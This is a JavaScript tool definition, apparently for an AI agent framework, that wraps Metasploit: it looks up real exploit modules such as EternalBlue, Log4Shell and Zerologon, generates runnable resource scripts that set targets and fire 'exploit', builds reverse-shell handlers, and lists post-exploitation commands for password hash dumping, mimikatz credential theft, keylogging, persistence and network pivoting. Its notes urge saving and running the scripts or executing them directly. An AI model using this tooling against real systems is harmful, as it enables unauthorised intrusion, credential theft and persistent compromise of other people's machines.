// OpenClaw Cyber — Metasploit RPC Interface
export const definition = {
  type: 'function',
  function: {
    name: 'metasploit_rpc',
    description: 'Interface with Metasploit Framework via msfrpcd or msfconsole commands. Generate resource scripts, search for modules, and build exploit/payload configurations. If msfrpcd is not running, generates ready-to-use msfconsole resource scripts (.rc files).',
    parameters: {
      type: 'object',
      properties: {
        action: {
          type: 'string',
          enum: ['search', 'generate_rc', 'exploit_config', 'post_exploit', 'handler'],
          description: 'Action: search modules, generate .rc file, configure exploit, generate post-exploitation script, or create handler'
        },
        query: { type: 'string', description: 'Search query or exploit module path (e.g., "exploit/multi/handler", "eternalblue")' },
        rhosts: { type: 'string', description: 'Target IP/range' },
        lhost: { type: 'string', description: 'Local/listener IP' },
        lport: { type: 'integer', description: 'Local port (default: 4444)' },
        payload: { type: 'string', description: 'Payload to use (e.g., "windows/meterpreter/reverse_tcp")' },
        options: { type: 'string', description: 'Additional options as Key=Value pairs, comma-separated' }
      },
      required: ['action']
    }
  }
};

export async function execute(args) {
  const { action, query, rhosts, lhost = '0.0.0.0', lport = 4444, payload, options } = args;
  
  switch (action) {
    case 'search':
      return _searchModules(query);
    case 'generate_rc':
      return _generateRC(query, rhosts, lhost, lport, payload, options);
    case 'exploit_config':
      return _exploitConfig(query, rhosts, lhost, lport, payload, options);
    case 'post_exploit':
      return _postExploit(query);
    case 'handler':
      return _generateHandler(lhost, lport, payload);
    default:
      return { success: false, error: `Unknown action: ${action}` };
  }
}

function _searchModules(query) {
  // Common exploit modules reference database
  const modules = {
    'eternalblue': { path: 'exploit/windows/smb/ms17_010_eternalblue', description: 'MS17-010 EternalBlue SMB RCE', os: 'Windows 7/2008 R2', payload: 'windows/x64/meterpreter/reverse_tcp' },
    'bluekeep': { path: 'exploit/windows/rdp/cve_2019_0708_bluekeep_rce', description: 'CVE-2019-0708 BlueKeep RDP RCE', os: 'Windows 7/2008 R2', payload: 'windows/x64/meterpreter/reverse_tcp' },
    'log4shell': { path: 'exploit/multi/http/log4shell_header_injection', description: 'CVE-2021-44228 Log4j RCE', os: 'Any Java', payload: 'java/meterpreter/reverse_tcp' },
    'shellshock': { path: 'exploit/multi/http/apache_mod_cgi_bash_env_exec', description: 'CVE-2014-6271 Bash ShellShock', os: 'Linux', payload: 'linux/x86/meterpreter/reverse_tcp' },
    'struts': { path: 'exploit/multi/http/struts2_content_type_ognl', description: 'Apache Struts 2 RCE', os: 'Any Java', payload: 'linux/x86/meterpreter/reverse_tcp' },
    'drupalgeddon': { path: 'exploit/unix/webapp/drupal_drupalgeddon2', description: 'Drupalgeddon2 RCE (CVE-2018-7600)', os: 'Linux', payload: 'php/meterpreter/reverse_tcp' },
    'tomcat': { path: 'exploit/multi/http/tomcat_mgr_upload', description: 'Tomcat Manager Upload WAR', os: 'Any Java', payload: 'java/meterpreter/reverse_tcp' },
    'jenkins': { path: 'exploit/multi/http/jenkins_script_console', description: 'Jenkins Script Console RCE', os: 'Any Java', payload: 'java/meterpreter/reverse_tcp' },
    'psexec': { path: 'exploit/windows/smb/psexec', description: 'PsExec via SMB', os: 'Windows', payload: 'windows/meterpreter/reverse_tcp' },
    'vsftpd': { path: 'exploit/unix/ftp/vsftpd_234_backdoor', description: 'vsftpd 2.3.4 Backdoor', os: 'Linux', payload: 'cmd/unix/interact' },
    'heartbleed': { path: 'auxiliary/scanner/ssl/openssl_heartbleed', description: 'OpenSSL Heartbleed Memory Leak', os: 'Any', payload: null },
    'smb_relay': { path: 'exploit/windows/smb/smb_relay', description: 'SMB Relay Attack', os: 'Windows', payload: 'windows/meterpreter/reverse_tcp' },
    'printnightmare': { path: 'exploit/windows/dcerpc/cve_2021_1675_printnightmare', description: 'PrintNightmare RCE', os: 'Windows', payload: 'windows/x64/meterpreter/reverse_tcp' },
    'proxyshell': { path: 'exploit/windows/http/exchange_proxyshell_rce', description: 'Exchange ProxyShell RCE', os: 'Windows', payload: 'windows/x64/meterpreter/reverse_tcp' },
    'zerologon': { path: 'exploit/windows/dcerpc/cve_2020_1472_zerologon', description: 'Zerologon Netlogon Bypass', os: 'Windows AD', payload: null },
  };

  if (!query) {
    return { success: true, modules: Object.entries(modules).map(([k, v]) => ({ keyword: k, ...v })) };
  }

  const matches = Object.entries(modules)
    .filter(([k, v]) => k.includes(query.toLowerCase()) || v.path.includes(query.toLowerCase()) || v.description.toLowerCase().includes(query.toLowerCase()))
    .map(([k, v]) => ({ keyword: k, ...v }));

  return {
    success: true,
    query,
    results: matches,
    note: matches.length > 0 ? 'Use generate_rc action with the module path to create a ready-to-use Metasploit resource script.' : 'No matches. Try broader terms.'
  };
}

function _generateRC(module, rhosts, lhost, lport, payload, options) {
  if (!module) return { success: false, error: 'module path required' };

  let rc = `# OpenClaw Auto-Generated Metasploit Resource Script\n`;
  rc += `# Generated: ${new Date().toISOString()}\n\n`;
  rc += `use ${module}\n`;
  if (rhosts) rc += `set RHOSTS ${rhosts}\n`;
  if (lhost) rc += `set LHOST ${lhost}\n`;
  if (lport) rc += `set LPORT ${lport}\n`;
  if (payload) rc += `set PAYLOAD ${payload}\n`;
  
  if (options) {
    for (const opt of options.split(',')) {
      const [key, value] = opt.split('=').map(s => s.trim());
      if (key && value) rc += `set ${key} ${value}\n`;
    }
  }

  rc += `show options\n`;
  rc += `exploit\n`;

  return {
    success: true,
    rc_script: rc,
    run_command: `msfconsole -r exploit.rc`,
    note: 'Save this as exploit.rc and run with the command above. Or use execute_command to write and run it.'
  };
}

function _exploitConfig(module, rhosts, lhost, lport, payload, options) {
  return _generateRC(module, rhosts, lhost, lport, payload, options);
}

function _postExploit(query) {
  const postModules = {
    'hashdump': 'run post/windows/gather/hashdump',
    'mimikatz': 'load kiwi\ncreds_all',
    'keylogger': 'keyscan_start\n# Wait then: keyscan_dump',
    'screenshot': 'screenshot',
    'persistence': 'run persistence -U -i 5 -p 4444 -r LHOST',
    'pivot': 'run autoroute -s TARGET_SUBNET/24\nuse auxiliary/server/socks_proxy\nset SRVPORT 1080\nrun',
    'escalate': 'use post/multi/recon/local_exploit_suggester\nset SESSION 1\nrun',
    'enum': 'sysinfo\ngetuid\nrun post/windows/gather/enum_logged_on_users\nrun post/multi/gather/env',
    'dump_creds': 'run post/windows/gather/credentials/credential_collector',
    'network': 'run post/multi/gather/ping_sweep RHOSTS=192.168.1.0/24',
    'portscan': 'run post/multi/gather/multi_command RESOURCE=/tmp/cmds.txt',
  };

  if (!query) {
    return { success: true, available: Object.keys(postModules), note: 'Specify a query to get the post-exploitation commands.' };
  }

  const matches = Object.entries(postModules)
    .filter(([k]) => k.includes(query.toLowerCase()))
    .map(([k, v]) => ({ name: k, commands: v }));

  return { success: true, query, results: matches.length > 0 ? matches : [{ note: 'No match. Available: ' + Object.keys(postModules).join(', ') }] };
}

function _generateHandler(lhost, lport, payload) {
  const p = payload || 'windows/meterpreter/reverse_tcp';
  const rc = `use exploit/multi/handler\nset PAYLOAD ${p}\nset LHOST ${lhost}\nset LPORT ${lport}\nset ExitOnSession false\nexploit -j\n`;
  return { success: true, handler_rc: rc, run_command: 'msfconsole -r handler.rc' };
}
